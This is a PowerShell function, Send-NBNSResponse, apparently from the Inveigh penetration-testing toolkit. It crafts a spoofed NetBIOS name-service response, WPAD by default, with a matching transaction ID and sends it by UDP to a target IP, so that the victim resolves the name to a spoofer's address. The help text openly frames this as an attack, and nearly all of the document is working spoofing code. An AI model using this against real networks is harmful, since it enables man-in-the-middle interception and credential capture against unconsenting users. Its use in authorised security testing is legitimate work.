
function Send-NBNSResponse
{
<#
.SYNOPSIS
Send-NBNSResponse sends a crafted NBNS response packet to a specific target. For name resolution to be successful,
the specified TargetIP, Hostname, and TransactionID must match a very (very very) recent NBNS request. You must
have an external method (wireshark,etc) of viewing the required NBNS request fields for traffic on the target
subnet. The odds of pulling this attack off manually are slim due to the narrow response window. I've only been
able to get it to work manually by watching tshark with the the transaction ID being listed in the output.
Ideally, this function would be fed by another script. 

.PARAMETER Hostname
Default = WPAD: Specify a hostname for NBNS spoofing.

.PARAMETER NBNSTTL
Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.

.PARAMETER SendPort
Default = 137: Specify a source port for the NBNS response.

.PARAMETER SpooferIP
IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the function host. 

.PARAMETER TargetIP
IP address to target for the NBNS response.

.PARAMETER TransactionID
NBNS transaction ID that matches the transaction from the NBNS request.

.EXAMPLE
Send-NBNSResponse -Target 192.168.1.11 -Hostname test -TransactionID 9c9e

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>


[CmdletBinding()]
param
(
[parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP="",
[parameter(Mandatory=$true)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$TargetIP="",
[parameter(Mandatory=$true)][ValidatePattern('^[A-Fa-f0-9]{4}$')][String]$TransactionID="",
[parameter(Mandatory=$true)][String]$Hostname = "",
[parameter(Mandatory=$false)][Int]$SendPort="137",
[parameter(Mandatory=$false)][Int]$NBNSTTL="165",
[parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$SpooferIP)
{ 
    $SpooferIP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
}

$Hostname = $Hostname.ToUpper()

$hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                  0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

$hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
$hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
$hostname_encoded = $hostname_encoded.Replace("-","")
$hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
$NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
[Array]::Reverse($NBNS_TTL_bytes)
$Transaction_ID_encoded = $TransactionID.Insert(2,'-')
$Transaction_ID_bytes = $Transaction_ID_encoded.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

for($i=0; $i -lt $hostname_encoded.Count; $i++)
{

    if($hostname_encoded[$i] -gt 64)
    {
        $hostname_bytes[$i] = $hostname_encoded[$i] + 10
    }
    else
    {
        $hostname_bytes[$i] = $hostname_encoded[$i] + 17
    }
    
}

$NBNS_response_packet = $Transaction_ID_bytes +
                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                        $hostname_bytes +
                        0x00,0x20,0x00,0x01 +
                        $NBNS_TTL_bytes +
                        0x00,0x06,0x00,0x00 +
                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                        0x00,0x00,0x00,0x00

$send_socket = New-Object System.Net.Sockets.UdpClient($SendPort)
$destination_IP = [System.Net.IPAddress]::Parse($TargetIP)
$destination_point = New-Object Net.IPEndpoint($destination_IP,137)
$send_socket.Connect($destination_point)
$send_socket.Send($NBNS_response_packet,$NBNS_response_packet.Length)
$send_socket.Close()
}